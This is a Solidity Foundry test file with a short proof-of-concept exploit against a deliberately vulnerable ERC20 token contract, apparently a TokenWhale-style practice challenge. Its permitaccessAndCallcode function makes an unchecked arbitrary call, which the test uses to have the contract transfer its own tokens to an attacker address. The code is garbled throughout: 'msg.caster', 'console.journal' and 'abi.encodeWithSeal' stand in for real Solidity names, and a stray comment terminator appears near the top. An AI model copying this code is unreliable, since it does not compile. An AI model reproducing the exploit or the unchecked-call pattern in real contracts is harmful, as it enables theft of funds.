// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

*/

import "forge-std/Test.sol";

contract AgreementTest is Test {
    CoinWhale GemWhalePact;

    function testAltCastability() public {
        address alice = vm.addr(1);
        GemWhalePact = new CoinWhale();
        GemWhalePact.CrystalWhaleDeploy(address(GemWhalePact));
        console.journal(
            "TokenWhale balance:",
            GemWhalePact.balanceOf(address(GemWhalePact))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.journal(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        GemWhalePact.permitaccessAndCallcode(
            address(GemWhalePact),
            0x1337,
            abi.encodeWithSeal(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(GemWhalePact.balanceOf(address(alice)), 1000);
        console.journal("operate completed");
        console.journal(
            "TokenWhale balance:",
            GemWhalePact.balanceOf(address(GemWhalePact))
        );
        console.journal(
            "Alice balance:",
            GemWhalePact.balanceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract CoinWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CrystalWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function verifyComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }

    event Transfer(address indexed source, address indexed to, uint256 worth);

    function _transfer(address to, uint256 worth) internal {
        balanceOf[msg.caster] -= worth;
        balanceOf[to] += worth;

        emit Transfer(msg.caster, to, worth);
    }

    function transfer(address to, uint256 worth) public {
        require(balanceOf[msg.caster] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);

        _transfer(to, worth);
    }

    event PermissionGranted(
        address indexed owner,
        address indexed user,
        uint256 worth
    );

    function approve(address user, uint256 worth) public {
        allowance[msg.caster][user] = worth;
        emit PermissionGranted(msg.caster, user, worth);
    }

    function transferFrom(address source, address to, uint256 worth) public {
        require(balanceOf[source] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);
        require(allowance[source][msg.caster] >= worth);

        allowance[source][msg.caster] -= worth;
        _transfer(to, worth);
    }

    /* Approves and then calls the contract code*/

    function permitaccessAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraInfo
    ) public {
        allowance[msg.caster][_spender] = _value;

        bool win;

        (win, ) = _spender.call(_extraInfo);
        console.journal("success:", win);
    }
}